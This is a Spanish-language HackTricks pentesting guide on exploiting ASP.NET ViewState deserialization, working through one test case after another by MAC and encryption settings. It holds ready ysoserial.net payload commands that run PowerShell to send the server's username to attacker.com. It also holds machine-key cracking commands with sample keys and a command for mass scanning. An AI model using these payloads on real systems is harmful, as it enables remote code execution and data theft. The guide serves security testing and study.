# Explotando \_\_VIEWSTATE sin conocer los secretos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - ¬°**estamos contratando**! (_se requiere fluidez en polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## ¬øQu√© es ViewState?

**ViewState** es el m√©todo que el framework ASP.NET utiliza de forma predeterminada para **preservar los valores de la p√°gina y los controles entre las p√°ginas web**. Cuando se renderiza el HTML de la p√°gina, el estado actual de la p√°gina y los valores que deben conservarse durante el postback se serializan en cadenas codificadas en base64 y se muestran en el campo o campos ocultos de ViewState.\
Las siguientes propiedades o combinaci√≥n de propiedades se aplican a la informaci√≥n de ViewState:

* Base64
* Puede definirse utilizando el atributo EnableViewStateMac y el atributo ViewStateEncryptionMode establecido en false
* Base64 + MAC (C√≥digo de Autenticaci√≥n de Mensajes) habilitado
* Puede definirse utilizando el atributo EnableViewStateMac establecido en true
* Base64 + Encriptado
* Puede definirse utilizando el atributo viewStateEncryptionMode establecido en true

## **Casos de prueba**

![](<../../.gitbook/assets/image (309) (2).png>)

### Caso de prueba: 1 ‚Äì EnableViewStateMac=false y viewStateEncryptionMode=false

Tambi√©n es posible deshabilitar completamente el ViewStateMAC estableciendo la clave de registro `AspNetEnforceViewStateMac` en cero en:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificaci√≥n de los atributos de ViewState**

Puedes intentar identificar si ViewState est√° protegido por MAC capturando una solicitud que contenga este par√°metro con BurpSuite:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

Si no se utiliza MAC para proteger el par√°metro, puedes explotarlo utilizando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net).
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Caso de prueba 1.5 - Como el caso de prueba 1 pero la cookie ViewState no es enviada por el servidor

Los desarrolladores pueden **eliminar ViewState** para que no forme parte de una solicitud HTTP (el usuario no recibir√° esta cookie).\
Uno podr√≠a asumir que si **ViewState** no est√° presente, su implementaci√≥n est√° **segura** de cualquier posible vulnerabilidad relacionada con la deserializaci√≥n de ViewState.\
Sin embargo, ese no es el caso. Si **agregamos el par√°metro ViewState** al cuerpo de la solicitud y enviamos nuestra carga √∫til serializada creada usando ysoserial, a√∫n podremos lograr **ejecuci√≥n de c√≥digo** como se muestra en el **Caso 1**.

### Caso de prueba 2 - .Net < 4.5 y EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar ViewState MAC** para una **p√°gina espec√≠fica**, necesitamos realizar los siguientes cambios en un archivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Tambi√©n podemos hacerlo para la aplicaci√≥n **en general** configur√°ndolo en el archivo **web.config** como se muestra a continuaci√≥n:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como el par√°metro est√° protegido por MAC, esta vez, para ejecutar con √©xito el ataque, primero necesitamos conocer la clave utilizada. En este caso, BurpSuite nos informar√° que el par√°metro est√° protegido por MAC:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) es otra herramienta que puede identificar machineKeys conocidos. Est√° escrita en Python, por lo que a diferencia de Blacklist3r, no tiene dependencia de Windows. Para los viewstates de .NET, hay una utilidad llamada "python blacklist3r", que es la forma m√°s r√°pida de usarla.

Puede suministrarse directamente con el viewstate y el generador:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

O bien, puede conectarse directamente a la URL objetivo e intentar extraer el viewstate del HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Para buscar viewstates vulnerables a gran escala, en conjunto con la enumeraci√≥n de subdominios, se puede utilizar el m√≥dulo `badsecrets` de [**BBOT**](exploiting-\_\_viewstate-parameter.md):
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

Si tienes suerte y encuentras la clave, puedes proceder con el ataque utilizando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
En los casos en los que el par√°metro `_VIEWSTATEGENERATOR` **no se env√≠a** por el servidor, **no** es necesario **proporcionar** el par√°metro `--generator`, **pero s√≠ estos**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Caso de prueba: 3 - .Net < 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true

En este caso, Burp no encuentra si el par√°metro est√° protegido con MAC porque no reconoce los valores. Entonces, probablemente el valor est√© encriptado y **necesitar√°s la Machine Key para encriptar tu carga √∫til** y explotar la vulnerabilidad.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.0.png)

**En este caso, el m√≥dulo** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **est√° en desarrollo...**

Antes de .NET 4.5, ASP.NET puede **aceptar** un par√°metro \_`__VIEWSTATE`\_ **sin encriptar** de los usuarios incluso si **`ViewStateEncryptionMode`** se ha establecido en _**Always**_. ASP.NET solo verifica la **presencia** del par√°metro **`__VIEWSTATEENCRYPTED`** en la solicitud. **Si se elimina este par√°metro y se env√≠a la carga √∫til sin encriptar, a√∫n se procesar√°**.

Por lo tanto, si se conoce la Machine Key (por ejemplo, a trav√©s de un problema de recorrido de directorios), se puede utilizar el comando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) utilizado en el **Caso 2** para realizar RCE utilizando la vulnerabilidad de deserializaci√≥n de ViewState.

* Elimina el par√°metro `__VIEWSTATEENCRYPTED` de la solicitud para explotar la vulnerabilidad de deserializaci√≥n de ViewState, de lo contrario, se mostrar√° un error de validaci√≥n de MAC de ViewState y la explotaci√≥n fallar√°, como se muestra en la figura:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/3.1.png)

### Caso de prueba: 4 - .Net >= 4.5 y EnableViewStateMac=true/false y ViewStateEncryptionMode=true/false excepto ambos atributos a false

Podemos forzar el uso del framework ASP.NET especificando el siguiente par√°metro dentro del archivo web.config, como se muestra a continuaci√≥n.
```markup
<httpRuntime targetFramework="4.5" />
```
Alternativamente, esto se puede hacer especificando la siguiente opci√≥n dentro del par√°metro `machineKey` del archivo web.config.
```bash
compatibilityMode="Framework45"
```
Como en el caso anterior, Burp no identifica si la solicitud est√° protegida por MAC porque el **valor est√° encriptado**. Entonces, para enviar una **carga √∫til v√°lida, el atacante necesita la clave**.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

Puedes intentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar la clave que se est√° utilizando:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para obtener una descripci√≥n m√°s detallada de IISDirPath y TargetPagePath, consulta [aqu√≠](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

O, con [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (con un valor de generador):
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Una vez que se identifica una clave de m√°quina v√°lida, **el siguiente paso es generar una carga √∫til serializada utilizando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Si tienes el valor de `__VIEWSTATEGENERATOR`, puedes intentar **usar** el par√°metro `--generator` con ese valor y **omitir** los par√°metros `--path` y `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Si se explota con √©xito la vulnerabilidad de deserializaci√≥n de ViewState, un servidor controlado por un atacante recibir√° una solicitud fuera de banda que contiene el nombre de usuario. [Prueba de concepto de explotaci√≥n exitosa](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### Caso de prueba 6: se est√° utilizando ViewStateUserKeys

La propiedad **ViewStateUserKey** se puede utilizar para **defenderse** contra un **ataque CSRF**. Si se ha definido una clave de este tipo en la aplicaci√≥n y tratamos de generar la carga √∫til de **ViewState** con los m√©todos discutidos hasta ahora, la **aplicaci√≥n no procesar√° la carga √∫til**.\
Necesitas usar un par√°metro adicional para crear correctamente la carga √∫til:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de una Explotaci√≥n Exitosa <a href="#poc" id="poc"></a>

Para todos los casos de prueba, si el payload ViewState de YSoSerial.Net funciona **exitosamente**, el servidor responde con un "error interno del servidor 500" y el contenido de la respuesta es "La informaci√≥n de estado no es v√°lida para esta p√°gina y puede estar corrupta". Adem√°s, obtenemos la solicitud OOB como se muestra en las siguientes figuras:

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

Solicitud fuera de banda con el nombre de usuario actual

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## Referencias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si est√°s interesado en una **carrera de hacking** y en hackear lo imposible, ¬°**estamos contratando!** (se requiere fluidez en polaco, tanto escrito como hablado).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
